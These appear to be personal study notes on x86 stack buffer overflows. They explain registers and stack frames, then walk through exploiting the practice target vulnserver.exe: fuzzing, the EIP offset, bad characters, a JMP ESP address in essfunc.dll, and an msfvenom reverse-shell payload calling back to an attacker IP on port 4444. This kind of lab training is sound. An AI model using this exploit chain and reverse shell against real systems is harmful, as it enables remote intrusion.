# basics

![Buffer Overflow](/img/x86Memory.png)

## Stack
* When a tread is running it execute code form the progam image or the DDLs.
* The thread requieres short term data areas for functions, variable, program control information => stack.
* Each threat has its own stack
* LIFO (push/pop)

## Function return mechanics
When code wihting a thread calls a function is must know on which address to return to once the function is completed

Example of return mechanics (stored in a section of stack called stack frame):
| Thread stack frame example|
| ------------- |
| Function A return address: 0x00401024 |
| Parameter 1 for Function A: 0x000000040|
| Parameter 2 for Function A: 0x000001000|

# CPU registers
Small high speed cpu storage locations
* Different registers exists from 32-bit to 8 bits

Most imporant registers (32-bit):
* EAX: for aritmecical and logic instrucations
* EBX: base pointer for memory addresses
* ECX: Loop, shift and rotation counter
* EDX: I/O Port addressing, division, multiplication
* ESI: Pointer of data and source 
* EDi: Pointer of data nd desination in string copy operations

* ESP stack pointer (keeps track of most receent reference locations by stack)
* EBP base pointer (stores a pointer to the top of the sack when a funciton is called)
* EIP always points to the next code instrucation to be executed

# sample volnurable code (C)
//what happens when buffer.length greater than 64? => buffer overflow; overflowing its reserved boundaries
``char buffer[64]; strcpy(buffer, argv[1]);``


# windows
## immunity debugger 
* Open file exe
* Then you can start debugging

## example vulnserver.exe (TCP server)
with nc you can setup a connection to vulnserver to check it

* but kill nc it and run the script ``bufferOverflowHelper.py`` and will hopefully result in something like ``Fuzzing crashed at 22105 bytes``
* Also we see in the immunulty debugger that EIP has been overridding and that it is failing

### detect location of EIP

* to detect location use: ``/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 24105``
* will generate a text and pass this into the ``bufferOverflowHelper.py``
* in immuniaty debugger save the EIP hex, f.i: ``386F4337``
* again with metasploit detect in which location the value is ``/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 24105 -q 386F4337``
* This will geneate the location: ``Exact match at offset 2003`` which means that EIP starts at *2003*

### override EIP
* in your python file substitute buffer where EIP starts (in our case *2003*) with ``buffer = "A" * 2003 + "B" * 4``
* when running the script we will set that EIP is ``42424242`` => BBBB
* Search for badchars in Google, leads to: https://github.com/mrinalpande/scripts/blob/master/python/badchars
* copy this bad chars in your python script and delete 00 && X70 put it in ``badchars`` variable
* buffer variable should look like ``buffer = "A" * 2003 + "B" * 4 + badchars`` 

### check hexdumb of ESP for bad chars
*We have to take the missing chars in the hex dump (Bad chars) out of the shell code for later!*
* check hexdumb of ESP (mark ESP Hex => right click => follow in dump)
(Hexdump) [img/bufferOverflowHexDumpESP.png]
* Check fump for missing chars, f.e.: : ``11 12 B0 14`` => 13 is missing and would be a bad char

### looking for DLL which has no protection (with Monamodules)
Some DLLs have protection against buffer overflow so we need to finds DLLs which do not have it.
* Download monamodule from github: (Mona)[https://github.com/corelan/mona]
* Paste mona.py file under: ``D:\Immunity Debugger\PyCommands``
* In immunuty debugger writh (text field in the lower left corner): ``!mona modules`` and hit enter
* We then see protection settings for certain dlls (check for everything false and attached to the program), in our examlpe: ``essfunc.dll``

### locate JMP commands
Pointer will jump to our malicuous shell code
* type ``locate nasm_shell``
* Call then the path: /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 
* Type ``JMP ESP`` and it will generate the hashcode equivalend of it: ``FFE4``
* In immunity debugger type in the lower left corner: ``!mona find -s "\xff\xe4" -m essfunc.dll`` => remember: \x *ff* \x *e4*
* Generates: ``\xff\xe4 & 0x625011af``
* In our script we write in reverse order ``buffer = "A" * 2003 + "\xaf\x11\x50\x62"``
* In immunity debugger debug (lclick on most right symbol, in line with the play button) and enter: ``625011af``
* We are overridding the EIP with our command, you will see the hash code 625011af

### gaining shell
Will generate some shell code for reverse shell
// -b including bad chars if we detected some
type with ip of the "acker": ``msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.9 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"``
* Copy this into our python file as overflow variable like: ``buffer = "A" * 2003 + "B" * 4 + "\xaf\x11\x50\x62" + overflow``
* Add naf space to variable (play a bit around with the size: "\x90" * 8) ``buffer = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 8 +  overflow``=> example bufferOverflowHelperFinal.py
* Start netcat on linux by listening on port 4444
* Run applicatino in admin mode and execute script
* Reverse shell established
